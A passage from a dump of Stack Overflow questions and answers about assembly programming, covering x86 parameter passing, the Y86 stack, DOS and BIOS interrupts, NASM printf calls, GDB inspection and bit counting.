    movss   DWORD PTR [ESP + 12], XMM0
    mov EAX, DWORD PTR [ESI]
    mov DWORD PTR [ESP + 16], EAX
    mov EAX, DWORD PTR [ESI + 4]
    mov DWORD PTR [ESP + 20], EAX
    call    _Z11passByValueicPif9TestClass


passByReference(i, c, p, f, tc)

    lea EAX, DWORD PTR [EBP - 16]
    lea ECX, DWORD PTR [EBP - 17]
    lea ESI, DWORD PTR [EBP - 24]
    lea EDI, DWORD PTR [EBP - 28]
    lea EBX, DWORD PTR [EBP - 40]
    mov DWORD PTR [ESP], EAX
    mov DWORD PTR [ESP + 4], ECX
    mov DWORD PTR [ESP + 8], ESI
    mov DWORD PTR [ESP + 12], EDI
    mov DWORD PTR [ESP + 16], EBX
    call    _Z15passByReferenceRiRcRPiRfR9TestClass

passByPointer(&amp;i, &amp;c, &amp;p, &amp;f, &amp;tc)

    lea EAX, DWORD PTR [EBP - 16]
    lea ECX, DWORD PTR [EBP - 17]
    lea ESI, DWORD PTR [EBP - 24]
    lea EDI, DWORD PTR [EBP - 28]
    lea EBX, DWORD PTR [EBP - 40]
    mov DWORD PTR [ESP], EAX
    mov DWORD PTR [ESP + 4], ECX
    mov DWORD PTR [ESP + 8], ESI
    mov DWORD PTR [ESP + 12], EDI
    mov DWORD PTR [ESP + 16], EBX
    call    _Z13passByPointerPiPcPS_PfP9TestClass

passArray(numbers)

    mov EAX, .L_ZZ4mainE7numbers
    mov DWORD PTR [EBP - 60], EAX
    mov EAX, .L_ZZ4mainE7numbers+4
    mov DWORD PTR [EBP - 56], EAX
    mov EAX, .L_ZZ4mainE7numbers+8
    mov DWORD PTR [EBP - 52], EAX
    lea EAX, DWORD PTR [EBP - 60]
    mov DWORD PTR [ESP], EAX
    call    _Z9passArrayPi

    // parameter access
    push    EAX
    mov EAX, DWORD PTR [ESP + 8]
    mov DWORD PTR [ESP], EAX
    pop EAX
</code></pre>

<p>I'm assuming I'm looking at the right assembly pertaining to the parameter passing because there are calls at the end of each!</p>

<p>But due to my very limited knowledge of assembly, I can't tell what's going on here. I learned about ccall convention, so I'm assuming something is going on that has to do with preserving the caller-saved registers and then pushing the parameters onto the stack. Because of this, I'm expecting to see things loaded into registers and ""push"" everywhere, but have no idea what's going on with the <code>mov</code>s and <code>lea</code>s. Also, I don't know what <code>DWORD PTR</code> is.</p>

<p>I've only learned about registers: <code>eax, ebx, ecx, edx, esi, edi, esp</code> and <code>ebp</code>, so seeing something like <code>XMM0</code> or <code>DL</code> just confuses me as well. I guess it makes sense to see <code>lea</code> when it comes to passing by reference/pointer because they use memory addresses, but I can't actually tell what is going on. When it comes to passing by value, it seems like there are many instructions, so this could have to do with copying the value into registers. No idea when it comes to how arrays are passed and accessed as parameters.</p>

<p>If someone could explain the general idea of what's going on with each block of assembly to me, I would highly appreciate it. </p>
","<p>Using CPU registers for passing arguments is faster than using memory, i.e. stack. However there is limited number of registers in CPU (especially in x86-compatible CPUs) so when a function has many parameters then stack is used instead of CPU registers. In your case there are 5 function arguments so the compiler uses stack for the arguments instead of registers. </p>

<p>In principle compilers can use <code>push</code> instructions to push arguments to stack before actual <code>call</code> to function, but many compilers (incl. gnu c++) use <code>mov</code> to push arguments to stack. This way is convenient as it does not change ESP register (top of the stack) in the part of code which calls the function.</p>

<p>In case of <code>passByValue(i, c, p, f, tc)</code> values of arguments are placed on the stack. You can see many <code>mov</code> instruction from a memory location to a register and from the register to an appropriate location of the stack. The reason for this is that x86 assembly forbids direct moving from one memory location to another (exception is <code>movs</code> which moves values from one array (or string as you wish) to another). </p>

<p>In case of <code>passByReference(i, c, p, f, tc)</code> you can see many 5 lea instructions which copy <em>addresses</em> of arguments to CPU registers, and these values of the registers are moved into stack.</p>

<p>The case of <code>passByPointer(&amp;i, &amp;c, &amp;p, &amp;f, &amp;tc)</code> is similar to <code>passByValue(i, c, p, f, tc)</code>. Internally, on the assembly level, pass by reference uses pointers, while on the higher, C++, level a programmer does not need to use explicitely the <code>&amp;</code> and <code>*</code> operators on references. </p>

<p>After the parameters are moved to the stack <code>call</code> is issued, which pushes instruction pointer <code>EIP</code> to stack before transferring the program execution to the subroutine. All <code>moves</code> of the parameters to the stack account for the coming <code>EIP</code> on stack after the <code>call</code> instruction.</p>
","19859661"
"Assembly: Y86 Stack and call, pushl/popl and ret instructions","18134","","<p>Unless I copied it wrong, the code above was written in the blackboard in a class by a student with the help/corrections of the teacher:</p>

<pre><code>int array[100], sum, i;

void ini() {
  for(i = 0; i &lt; 100; i++)
    array[i] = i;
}

int main() {
  ini();

  sum = 0;

  for(i = 0; i &lt; 100; i++)
    sum += array[i];
}

.pos 0
  irmovl Stack, %esp
  rrmovl Stack, %ebp

  jmp main

array:
.pos 430

sum: .long 0
i: .long 0

main:
  call ini                     //

  irmovl $0, %eax              // %eax = 0
  irmovl sum, %esi             // %esi = 0xsum
  rmmovl %eax, 0(%esi)         // 0(%esi) = %eax &lt;=&gt; 0(0xsum) = 0 [sum = 0]
  rmmovl %eax, 4(%esi)         // 4(%esi) = %eax &lt;=&gt; 4(0xsum) = 0 [i = 0]

compare:
  irmovl $100, %ebx            // %ebx = 100
  subl %eax, %ebx              // %ebx = %ebx - %eax &lt;=&gt; %ebx = 100 - i
  jle finish                   // Jumps to ""finish"" if SF=1 pr ZF=0

  mrmovl 0(%esi), %edx         // %edx = 0(%esi) &lt;=&gt; %edx = 0(0xsum) = sum
  addl %eax, %edx              // %edx = %edx + %eax &lt;=&gt; %edx = sum + i =&gt; sum
  rmmovl %edx, 0($esi)         // 0(%esi) = %edx &lt;=&gt; 0(0xsum) = sum

  irmovl $1, %ecx              // %ecx = 1
  addl %ecx, %eax              // %eax = %eax + %ecx &lt;=&gt; %eax = i + 1 =&gt; i
  rmmovl %eax, 4(%esi)         // 4($esi) = %eax &lt;=&gt; 4(0xsum) = i

  jmp compare                  // Jumps unconditionally to ""compare""

ini:
  pushl %ebp                   //
  rrmovl %esp, %ebp            //
  pushl %ebx                   //
  pushl %eax                   //

  irmovl $0, %eax              // %eax = 0
  rmmovl %eax, -8(%ebp)        //

ini_compare:
  irmovl $100, %ecx            // %ecx = 100
  subl %eax, %ecx              // %ecx = %ecx - %eax &lt;=&gt; %ecx = 100 - i
  jle ini_finish               // Jumps to ""ini_finish"" if SF=1 pr ZF=0

  rrmovl %eax, %ebx            // %ebx = %eax &lt;=&gt; %ebx = i
  addl %eax, $ebx              // %ebx = %ebx + %eax &lt;=&gt; %ebx = i + i = 2i
  addl %ebx, %ebx              // %ebx = %ebx + %ebx &lt;=&gt; %ecx = 2i + 2i = 4i
  rmmovl %eax, array(%ebx)     // array(%ebx) = %eax &lt;=&gt; array(0x4i) = i

  irmovl %1, %ecx              // %ecx = 1
  addl %ecx, %eax              // %eax = %eax + %ecx &lt;=&gt; %eax = i + 1 =&gt; i
  rmmovl %eax, -8(%ebp)        //

  jmp ini_compare              // Jumps unconditionally to ""ini_compare""

ini_finish:
  irmovl $4, %ebx              //
  addl %ebx, %esp              //
  popl %ebx                    //
  popl %ebp                    //

  ret                          //

.pos 600
  Stack .long 0
</code></pre>

<p>As you can see, there are a bunch of comments in all the instructions and I got (I think) most of them, what's confusing me is the call, pushl/popl and ret instructions. I don't quite understand them and I also don't understand what's happening to the stack and where all the records are pointing. Basically, the lines with comments (//) that don't have anything written on them.</p>

<p>It's really important I understand how all this works, hopefully, some of you can shed some light upon all this mess.</p>

<p><strong>Some notes on my comments:</strong>   </p>

<ul>
<li><strong>0xsum:</strong> This doesn't mean the address is ""sum"", it would be impossible. It just a means to understand what I'm talking about without using the exact memory address.</li>
<li><strong>[sum = 0]:</strong> This means that in our C code, the variable sum will be set as 0 at this point.</li>
<li><strong>i + 1 => i:</strong> This means that we are incrementing the value of 'i' by one and that in the following line 'i' will actually represent that incremented value.</li>
</ul>
","<p>Let's look at some of the code:</p>

<pre><code>main:
  call ini
</code></pre>

<p>This will push the value of the instruction pointer to the stack (so that you can later return to this position in the code), and jump to the address of the ini label. The 'ret' instruction uses the value stored on the stack to return from the subroutine.</p>

<p>The following is the initialisation sequence of a subroutine. It saves the values of some registers on the stack and sets up a stack frame by copying the stack pointer (esp) to the base pointer register (ebp). If the subroutine has local variables, the stack pointer is decremented to make room for the variables on the stack, and the base pointer is used to access the local variables in the stack frame. In the example the only local variable is the (unused) return value.</p>

<p>The push instruction decrements the stack pointer (esp) with the data size of what's going to be pushed, then stores the value at that address. The pop instruction does the opposite, first getting the value, then increments the stack pointer. (Note that the stack grows downwards, so the stack pointer address gets lower when the stack grows.)</p>

<pre><code>ini:
  pushl %ebp             // save ebp on the stack
  rrmovl %esp, %ebp      // ebp = esp (create stack frame)
  pushl %ebx             // save ebx on the stack
  pushl %eax             // push eax on the stack (only to decrement stack pointer)
  irmovl $0, %eax        // eax = 0
  rmmovl %eax, -8(%ebp)  // store eax at ebp-8 (clear return value)
</code></pre>

<p>The code follows a standard pattern, so it looks a bit awkward when there are no local variables, and there is an unused return value. If there are local variables a subtraction would be used to decrement the stack pointer instead of pushing eax.</p>

<p>The following is the exit sequence of a subroutine. It restores the stack to the position before the stack frame was created, then returns to the code that called the subroutine.</p>

<pre><code>ini_finish:
   irmovl $4, %ebx   // ebx = 4
   addl %ebx, %esp   // esp += ebx (remove stack frame)
   popl %ebx         // restore ebx from stack
   popl %ebp         // restore ebp from stack
   ret               // get return address from stack and jump there
</code></pre>

<p>In response to your comments:</p>

<p>The ebx register is pushed and popped to preserve it's value. The compiler apparently always puts this code there, probably because the register is very commonly used, just not in this code. Likewise a stack frame is always created by copying esp to ebp even if it's not really needed.</p>

<p>The instruction that pushes eax is only there to decrement the stack pointer. It's done that way for small decrements as it's shorter and faster than subtracting the stack pointer. The space that it reserves is for the return value, again the compiler apparently always does this even if the return value is not used.</p>

<p>In your diagram the esp register is consistently pointing four bytes too high in memory. Remember that the stack pointer is decremented after pushing a value, so it will point to the value pushed, not to the next value. (The memory addresses are way off also, it's something like 0x600 rather than 0x20, as that's where the Stack label is declared.)</p>
","1022029"
"MASM/NASM Differences","18104","","<p>What are the syntax differences between the NASM and MASM assemblers?</p>
","<p>Section 2.2 of the NASM documentation is titled <a href=""http://www.nasm.us/doc/nasmdoc2.html#section-2.2"" rel=""noreferrer"">Quick Start for MASM Users</a> which lists the important differences between NASM and MASM.</p>
","2035913"
"Reading a number using INT 21h (DOS) & 8086 assmebly","18076","","<p>I need to prompt to user a msg that tells him to write a number , then I store this number and do some operation on it 
After searching in INT 21h I found this : </p>

<pre><code>INT 21h / AH=1 - read character from standard input, with echo, result is stored in AL.
if there is no character in the keyboard buffer, the function waits until any key is pressed. 

example:

    mov ah, 1
    int 21h
</code></pre>

<p>The main problem that this only reads one character and represent it as ASCII 
so If I need to write the number ""357"" 
I will read it as 3 , 5 , 7 </p>

<p>and this is not my goal . 
any ideas ?</p>
","<p><a href=""http://www.masm32.com/board/index.php?topic=17146.0"" rel=""nofollow"">When you managed to get the user input</a>, put the its pointer in ESI (ESI = address to the string)</p>

<pre><code>.DATA
myNumber BYTE ""12345"",0        ;for test purpose I declare a string '12345'

Main Proc
    xor ebx,ebx                ;EBX = 0
    mov  esi,offset myNumber   ;ESI points to '12345'

loopme:

    lodsb                      ;load the first byte pointed by ESI in al

    cmp al,'0'                 ;check if it's an ascii number [0-9]
    jb noascii                 ;not ascii, exit
    cmp al,'9'                 ;check the if it's an ascii number [0-9]
    ja noascii                 ;not ascii, exit

    sub al,30h                 ;ascii '0' = 30h, ascii '1' = 31h ...etc.
    cbw                        ;byte to word
    cwd                        ;word to dword
    push eax
    mov eax,ebx                ;EBX will contain '12345' in hexadecimal
    mov ecx,10
    mul ecx                    ;AX=AX*10
    mov ebx,eax
    pop eax
    add ebx,eax
    jmp loopme                 ;continue until ESI points to a non-ascii [0-9] character
    noascii:
    ret                        ;EBX = 0x00003039 = 12345
Main EndP
</code></pre>
","7876817"
"Executing assembler code with python","18064","","<p>I want to execute assembly code inside a python script. Is that possible?</p>

<p>In C programming would be like this</p>

<pre><code>static inline getesp(){
        __asm__(""mov %esp, %eax"");
}
</code></pre>

<p>But how to do that with Python? Is it possible?</p>
","<p>One way you could do this would be to write a (C) extension for Python.  You can take a look at <a href=""http://docs.python.org/extending/"">this</a> documentation for full details of how to do that.</p>

<p>Another way of developing C-based Python extensions would be to interface directly with an external library using the <a href=""http://docs.python.org/library/ctypes.html"">ctypes</a> module.  </p>

<p>In any case, you'd need some C code compiled into either a library or an extension and a way to call it from Python.  Clearly for what you want to achieve this is probably not optimal but actually its not that much work to expose a few functions.</p>
","6041026"
"Count bits in the number","18053","","<h3>Duplicate:</h3>

<blockquote>
  <p><a href=""https://stackoverflow.com/questions/109023/best-algorithm-to-count-the-number-of-set-bits-in-a-32-bit-integer"">Best algorithm to count the number of set bits in a 32-bit integer?</a></p>
</blockquote>

<hr>

<p>Suppose you have a number. Is there any way to count the bits which equals to 1 in binary representation of that number, not using iteration? I mean, is there any way to do it in constant time using some bitwise operators and masks. I need solution which will work well for both architectures 32 bit and 64 bit. Ah almost forgot, I need it for C language or assembler is also good.</p>
","<p>There is a bit counting algorithm without a loop at <a href=""http://graphics.stanford.edu/~seander/bithacks.html"" rel=""nofollow noreferrer"">http://graphics.stanford.edu/~seander/bithacks.html</a>. Lots of bit counting algorithms at <a href=""http://gurmeetsingh.wordpress.com/2008/08/05/fast-bit-counting-routines/"" rel=""nofollow noreferrer"">http://gurmeetsingh.wordpress.com/2008/08/05/fast-bit-counting-routines/</a></p>
","843749"
"What are CPU registers and how are they used, particularly WRT multithreading?","17955","","<p>This question and my answer below are mainly in response to an area of confusion in another question.</p>

<p>At the end of the answer, there are some issues WRT ""volatile"" and thread synchronisation that I'm not entirely confident about - I welcome comments and alternative answers. The point of the question primarily relates to CPU registers and how they are used, however.</p>
","<p>CPU registers are small areas of data storage on the silicon of the CPU. For most architectures, they're the primary place all operations happen (data gets loaded in from memory, operated on, and pushed back out).</p>

<p>Whatever thread is running uses the registers and owns the instruction pointer (which says which instruction comes next). When the OS swaps in another thread, all of the CPU state, including the registers and the instruction pointer, get saved off somewhere, effectively freeze-drying the state of the thread for when it next comes back to life.</p>

<p>Lots more documentation on all of this, of course, all over the place. <a href=""http://en.wikipedia.org/wiki/Processor_register"" rel=""noreferrer"">Wikipedia on registers.</a> <a href=""http://en.wikipedia.org/wiki/Context_switch"" rel=""noreferrer"">Wikipedia on context switching.</a> for starters. Edit: or read Steve314's answer. :)</p>
","2384596"
"Whats the best resource to learn Assembly language for PIC microcontroller's","17903","","<p>I'm going to start working on a project where I need to have a decent understanding of Assembly language for the PIC microcontroller's.  I'm intimately familiar with C/C++, so I know how to code for the most part, and I have done many projects for the PIC already so I understand the architecture, but have done all my programming for it in 'C'.</p>

<p>Is there a good book or website which does a good job explaining what all the Assembly commands mean and how to do fairly simple tasks (blink LED's, basic math, etc...) for the PIc microcontroller?</p>

<p>Edit:  The primary purpose of this post is to request resources for learning Assembly, not debating the merits of C vs Assembly in the PIC's, or whether the PIC is a 'good' microcontroller to use.  I am using a PIC18 microcontroller if that makes any difference.</p>
","<p>I would try this:
<a href=""http://www.mstracey.btinternet.co.uk/pictutorial/picmain.htm"" rel=""nofollow noreferrer"">Pic Tutorial</a></p>
","1473528"
"string length for mips assembly","17897","","<p>Whenever I run the following code:</p>

<pre><code>#counts length of a string

.data
 .data
string: .asciiz ""Hello""

printedMessage: .asciiz ""The length of the string: ""

    .text
main:
  la $a0, string             # Load address of string.
        jal strlen              # Call strlen procedure.
        jal print
        addi $a1, $a0, 0        # Move address of string to $a1
        addi $v1, $v0, 0        # Move length of string to $v1
        addi $v0, $0, 11        # System call code for message.
        la $a0, printedMessage            # Address of message.
        syscall
        addi $v0, $0, 10        # System call code for exit.
        syscall


strlen:
li $t0, 0 # initialize the count to zero
loop:
lb $t1, 0($a0) # load the next character into t1
beqz $t1, exit # check for the null character
addi $a0, $a0, 1 # increment the string pointer
addi $t0, $t0, 1 # increment the count
j loop # return to the top of the loop
exit:
jr $ra

print:
li $v0, 4
  la $a0, printedMessage
  syscall

  li $v0, 1
  move $a0, $t1
  syscall


jr $ra
</code></pre>

<p>The QtSpim console prints ""The length of the string: 0-"". I've played around a bit with my print method, but I'm not sure what the problem is. 
So, the question:
How do I fix my print outs? I should be printing out the info in $t0 since it's the counter. </p>

<p>Thanks in advance!</p>
","<p>Not entirely sure what you mean by fix print out, but one problem is that your count register in the strlen function is <code>$t0</code> while your second syscall in <code>print:</code> is called with argument <code>$t1</code></p>

<p>Changing that <code>$t1</code> to <code>$t0</code> and running it gives output 5.</p>
","20514079"
"Some x86 ASM Reference/Tutorials?","17865","","<p>I'm trying to find some references in regards to x86 Assembly languages. Tutorials/Examples to help my understanding.
-Thanks</p>
","<ul>
<li><a href=""http://download.savannah.gnu.org/releases/pgubook/ProgrammingGroundUp-1-0-booksize.pdf"" rel=""noreferrer"">Programming from the Ground Up</a> (free book, highly recommended)</li>
<li><a href=""http://en.wikibooks.org/wiki/X86_Assembly"" rel=""noreferrer"">x86 Assembly</a> (wikibooks.org)</li>
<li><a href=""http://learn86.awardspace.co.uk/"" rel=""noreferrer"">Essential Resources for x86 Programmers</a></li>
</ul>
","214737"
"Beginners Assembly Language","17620","","<p>Where could one start learning assembly language from? Could you suggest some place that can get me kick-started with it?</p>
","<p>Back in college I used to use the awesome <a href=""http://www.emu8086.com/"" rel=""noreferrer"">8086 Microprocessor Emulator</a> for Assembly programming on Windows. There are <a href=""http://www.emu8086.com/assembly_language_tutorial_assembler_reference/asm_tutorial_01.html"" rel=""noreferrer"">beginner tutorials</a> available on its website.  </p>

<p>No matter what resource you use, it's important to be patient while learning Assembly. You might understand nothing while reading the first hundred pages, keep on &amp; eventually you'll understand 'em all.</p>
","1932462"
"Fastest way to scan for bit pattern in a stream of bits","17543","","<p>I need to scan for a 16 bit word in a bit stream. <em>It is not guaranteed to be aligned on byte or word boundaries</em>.  </p>

<p>What is the fastest way of achieving this? There are various brute force methods; using tables and/or shifts but are there any ""bit twiddling shortcuts"" that can cut down the number of calculations by giving yes/no/maybe contains the flag results for each byte or word as it arrives?</p>

<p>C code, intrinsics, x86 machine code would all be interesting.</p>
","<p>I think precalc all shifted values of the word and put them in 16 ints
so you got an array like this</p>

<pre><code> unsigned short pattern = 1234;
 unsigned int preShifts[16];
 unsigned int masks[16];
 int i;
 for(i=0; i&lt;16; i++)
 {
      preShifts[i] = (unsigned int)(pattern&lt;&lt;i);  //gets promoted to int
      masks[16] = (unsigned int) (0xffff&lt;&lt;i);
 }
</code></pre>

<p>and then for every unsigned short you get out of the stream, make an int of that short and the previous short and compare that unsigned int to the 16 unsigned int's. If any of them match, you got one.</p>

<p>so basically like this:</p>

<pre><code>  int numMatch(unsigned short curWord, unsigned short prevWord)
  {
       int numHits = 0;
       int combinedWords = (prevWord&lt;&lt;16) + curWord;

       int i=0;
       for(i=0; i&lt;16; i++)
       {
             if((combinedWords &amp; masks[i]) == preShifsts[i]) numHits++;
       }
       return numHits;
  }
</code></pre>

<p>edit:
do note that this could potentially mean multiple hits when the patterns is detected more than once on the same bits:</p>

<p>e.g.  32 bits of 0's and the pattern you want to detect is 16 0's, then it would mean the pattern is detected 16 times!</p>
","1572469"
"I don't understand how to use Interrupt 21, AH=0ah","17505","","<p>My information is coming from <a href=""http://www.ctyme.com/intr/rb-2563.htm"" rel=""noreferrer"">here</a>. The assignment asks for a program that reads in no more than 20 characters, converts those characters to upper case, and then prints the input as capitals. </p>

<p>I have no idea how to access the input from int21/AH=0ah. I really can't ask a more precise question unless I understand what is linked above. Can someone explain? Also, I'm using TASM if that makes any difference. Also, I'm testing this on freedos.</p>

<p><strong>UPDATE1:</strong></p>

<p>Alright, thanks to your help, I believe I understand how the interrupt needs to be set up and behaves.</p>

<p><strong>Setup:</strong>
I have to designate a ds:dx where I want this buffer to exist</p>

<p>I have to set ds:dx to 20 (which sets the max number of characters the buffer can hold)</p>

<p>I have to set ds:dx+1 to 0 (which I think somehow set a min number of characters to read in)</p>

<p>Actually call int21/AH=0ah, which will go to ds:dx and interpret the preset bytes. It will halt the program while it waits for input</p>

<p>int21/AH=0ah will fill from ds:dx+2+n with my input (where n is the number of characters input including '\r')</p>

<p>My question is now, how do I do this. I've just looked through the x86 Assembly Language Reference again, but haven't been able to find anything helpful yet.</p>

<p>Code I've got so far</p>

<pre><code>           assume          cs:code,ds:code
code       segment
start:

           mov  ax,code ;moves code segment into reg AX
           mov  ds,ax   ;makes ds point to code segment

           mov  ah,0ah
           int  21h
           mov  ax,1234h  ;breakpoint

           mov  ah,9
           mov  dx,offset message
           int  21h

endNow:
           ;;;;;;;;;;ends program;;;;;;;;;;
           mov  ah,0  ;terminate program
           int  21h   ;program ends

message    db   'Hello world!!!',13,10,'$'
code       ends
           end  start
</code></pre>
","<p>That DOS function retrieves a buffer with user input. See this <a href=""http://spike.scu.edu.au/~barry/interrupts.html#ah0a"" rel=""noreferrer"">table</a>. It seems that program is using that call to pause execution waiting for the user to resume the program.</p>

<p>Edit: I just reread the question. I thought you were only asking what the function call did in your given source. If you want to read input of no more than 20 characters, you first need memory to store it. Add something like this:</p>

<pre><code>bufferSize  db 21  ; 20 char + RETURN
inputLength db 0   ; number of read characters
buffer      db 21 DUP(0) ; actual buffer
</code></pre>

<p>Then fill the buffer:</p>

<pre><code>mov ax, cs
mov ds, ax ; ensure cs == ds
mov dx, offset bufferSize ; load our pointer to the beginning of the structure
mov ah, 0Ah ; GetLine function
int 21h
</code></pre>

<p>How to convert to uppercase is left to the reader.</p>
","13206675"
"How to read local variables with gdb?","17451","","<p>I know that you can find any parameters by looking at a positive offset from $ebp using gdb:</p>

<pre><code>(gdb) x/4wx $ebp
</code></pre>

<p>Then, I would look at the 3rd and 4th addresses using <code>x/s</code> because they would be the first and second parameter. What about for local variables? How would I look at the values at a negative offset from $ebp?
Also, is there anyway to look at the value of $eax?
Whenever I try to print the value of $eax using <code>x/s $eax</code>, the address is out of bound or the value is 0, which I am sure that it is not because I just put a constant value in the register.</p>

<p>I tried <code>info locals</code> but I get the message ""No symbol table info available"".</p>
","<p>First you need to compile debugging the symbols into your binary.  Use the -g option on gcc with your current command to do this.  If you're using a different compiler you will need to consult its documentation.  After this, 'info locals' and the print command will work.</p>

<p>To look at any local variable all you need to do is use the 'print' command.  For example to look at the local variable 'i' it's as easy as 'print i'.  </p>

<p>You should be able to handle $eax in the same way as $ebp.  I suspect you have problems because you're using x/s.  x/s will try and print out a string, and so it will continue until it hits a null character.  If this doesn't happen for a long time then the length of the string will go out of bounds.  Try 'x/d $eax'.  You can even do 'print $eax'.  You can also use 'info registers' to get all the register data.</p>
","5959796"
"How can I clear the screen without having to fill it","17379","","<p>Does an interrupt service routine exist to help me clear the screen of the terminal? Will it work on windows?</p>
","<p>Setting a graphics mode through BIOS (int 10h with AH=0) will clear the screen.</p>

<p>Scrolling the screen up or down through BIOS (int 10h with AH=6 or 7) can clear the screen as well.</p>

<p>This will only work where you can invoke BIOS service functions.</p>

<p>MSDOS is where this will always work.</p>

<p>In Windows this will work only in DOS applications and if Windows can actually run them. 64-bit editions of Windows don't support DOS applications at all and starting with Windows Vista even in 32-bit editions of Windows many DOS apps don't work fully.</p>

<p>Remember also that if a DOS application runs in a window in Windows, only that window will get cleared, not the entire screen.</p>
","8239321"
"""Assembly"" vs. ""Assembler""","17319","","<p>I've been taught that ""assembly"" is what you write in your files, to have your ""assembler"" convert it into binary code.</p>

<p>But I see these two terms mixed and matched in various works. I've even heard that you write ""assembler"", after which an ""assemblator"" makes it executable.</p>

<p>Tell me, please, what's the right words to use?</p>
","<p>Actually, the language is called ""Assembly Language"", and the tool to convert it to machine code is the ""Assembler"".</p>

<p>More info on Wikipedia: <a href=""http://en.wikipedia.org/wiki/Assembly_language"" rel=""noreferrer"">http://en.wikipedia.org/wiki/Assembly_language</a></p>
","1176148"
"calling printf in x86 to print an integer","17319","","<p>I'm trying to call printf to print an integer, put it doesn't print the right value:</p>

<pre><code>section .data

         an:    db 1
         format: db ""num: %d"" , 10, 0

section .text
         global main
         extern printf

main:
         push ebp
         mov ebp,esp

         mov eax, [an]
         push eax
         push dword format
         call printf

         add esp, 8
         mov esp,ebp
         pop ebp

         mov eax, 0
         ret
</code></pre>

<p>this code prints ""num: 1836412417""</p>

<p>put when I try to print a char it works!</p>

<pre><code>section .data

         an:    db 'a'
         format: db ""num: %c"" , 10, 0

section .text
         global main
         extern printf

main:
         push ebp
         mov ebp,esp

         mov eax, [an]
         push eax
         push dword format
         call printf

         add esp, 8
         mov esp,ebp
         pop ebp

         mov eax, 0
         ret
</code></pre>

<p>now it prints ""num: a""</p>

<p>so what's wrong with the first code ?!!</p>
","<p><code>db</code> declares 8-bit (one byte) values, while <code>%d</code> prints 32-bit (four byte) values on x86.</p>

<p>In effect, when loading 32-bit register <code>eax</code> with <code>mov eax, [an]</code> you are loading bits of letters <code>""num""</code> to high bytes of the register. They are later printed as number, when using <code>%d</code> or ignored when using <code>%c</code>.</p>

<p>To declare 32 bit values you should use <code>dd</code>, instead of <code>db</code>.</p>
","29143047"
"Multiplying two values and printing them to the screen (NASM, Linux)","17255","","<p>I keep reading that in order for one to perform integer/floating point division on a register, the register(s) being performed on need to actually be <code>initialized</code>. I'm curious to what the proper assembler directive is to do this. Do I simply provide an address by something like:</p>

<p><code>mov ecx, 0x65F ;0x65F represents an address for ecx to point to</code>.</p>

<p>And then promptly (later in code) do something like:</p>

<p><code>mov byte [ecx], 0xA ;move the value of 0xA into the contents of ecx, using only a byte's worth of data</code> </p>

<p>Is this the proper way to perform such an operation? If not, what is?</p>

<p><strong>Update</strong></p>

<p>Ok, so what I'm trying to do is basically multiply two values and print them to the screen.
The code is as follows, and for some reason every time I try to divide <code>edx</code> I get either a segmentation fault or a floating point arithmatic exception. Could someone explain to me what it is that I'm doing wrong?</p>

<p><strong>Code</strong></p>

<pre><code>section .data
    counter: db 0xA                         ;store value 10 in 'counter', while allocating only one byte. This will be used for decrementing purposes
section .bss
    valueToPrint: resb 4                    ;alloc 4 bytes of data in 'valueToPrint'

section .text

global _start

_print_char:                    
    add eax, '0'                ;convert to ascii
    mov [valueToPrint], eax     ;store contents of 'eax' in valueToPrint
    mov eax, 4                  ;syswrite
    mov ebx, 1                  ;stdout
    mov ecx, valueToPrint       ;machine will take whatever value exists in 'ecx' and print
    mov edx, 1                  ;print only a single byte's worth of data
    int 0x80                    ;invoke kernel to perfrom instruction
    ret                         

_convert_values:
    mov edx, 0xA                ;dividing eax by 10, which will lower its tens place
    div edx                     ;(**Program crash here**)do division: remainder SHOULD be stored in edx
    mov byte [edx], 0x0         ;zero out edx       
    call _print_char            ;do printing for latest character
    dec byte [counter]          ;decrement counter
    mov dword [eax], counter    ;store counter in eax
    jnz _convert_values         ;while eax &gt; 0 continue process

_endl:
    mov eax, '\n'               ;store newline character in eax to be printed
    call _print_char            ;print value
    ret                 

_mul:
    mov eax, 0x2A ;store 42 in eax
    mov edx, 0x2B ;store 43 in edx
    mul edx       ;multiply [eax] * [edx]
    ret

_safe_exit:
    mov eax, 1  ;initiate 'exit' syscall
    mov ebx, 0  ;exit with error code 0
    int 0x80    ;invoke kernel to do its bidding 

_start:
    nop                             ;used to keep gdb from complaining

    call _mul                       ;multiply the values
    call _convert_values            ;do hex to ascii conversion

    jmp _safe_exit                  ;use jmp as opposed to call since it technically doesn't 'ret'
</code></pre>
","<p>We spoke separately in chat....</p>

<p>Here's a working version to play with.</p>

<p>It has a subtle problem.  Can you find it?
Can you explain WHY it does what it does?</p>

<pre><code>; Multiply two numbers, display in ascii/decimal
;
; (because I have a 64bit system, this forces 32bit code)
        bits    32
;
        section .text
;
; _start is the ONLY label you MUST prepend _
; others might be library functions (ex: _printf,_exit)
; pure assembly only needs _start, if linked with glibc
; typically need _main INSTEAD of _start
;
        global _start
;
;
_start:
        nop                             ;placeholder for gdb's debug interrupt
;
        call    mul                     ;multiply the values
        call    convert_values          ;do hex to ascii conversion
;
        jmp     safe_exit               ;use jmp as opposed to call since it technically doesn't 'ret'
;
;
; subroutines / functions follow
;
mul:
        mov     eax, 0x2A               ;store 42 in eax
        mov     edx, 0x2B               ;store 43 in edx (42*43=1806)
        mul     edx                     ;multiply eax*edx, result in edx:eax
        ret
;
; this routine doesn't handle BIG values from 'mul' which extend into edx
; we're learning, don't make things multiply out to more than 4.2 billion-ish
convert_values:
        mov     edx,0                   ;value actually edx:eax, zero edx
        mov     ecx,0x0A                ;divide edx:eax by 10
        idiv    ecx                     ;result in eax, remainder in edx
        push    eax                     ;save value on stack
        mov     eax,edx                 ;put remainder (0-9) in eax
        add     eax,'0'                 ;convert value to ascii character
        call    print_char              ;print the latest character
        pop     eax                     ;restore value
        or      eax,eax                 ;set flags based on eax value
        jnz     convert_values          ;while eax != 0 continue process
;
; nasm doesn't convert \n into LF... just use 10, equivalent
endl:
        mov     eax, 10                 ;store newline character in eax to be printed
        call    print_char              ;print value
        ret
;
print_char:
        mov     [valueToPrint], eax     ;store contents of 'eax' in [valueToPrint]
        mov     eax, 4                  ;syswrite
        mov     ebx, 1                  ;stdout
        mov     ecx, valueToPrint       ;machine will take whatever value exists in [ecx] and print
        mov     edx, 1                  ;print only a single byte's worth of data
        int     0x80                    ;invoke kernel to perfrom instruction
        ret
;
safe_exit:
        mov     eax,1                   ;initiate 'exit' syscall
        mov     ebx,0                   ;exit with error code 0
        int     0x80                    ;invoke kernel to do its bidding
;
; =====================================
        section .bss
; this section is not allocated, just reserved.
; Automatically set to zero when program starts
;
; alloc 4 bytes of data in 'valueToPrint'
valueToPrint:
        resd    1               ; 1 resd=4 resb (Dword/Byte)
;
;
</code></pre>

<blockquote>
  <p>Spoiler Alert...</p>
  
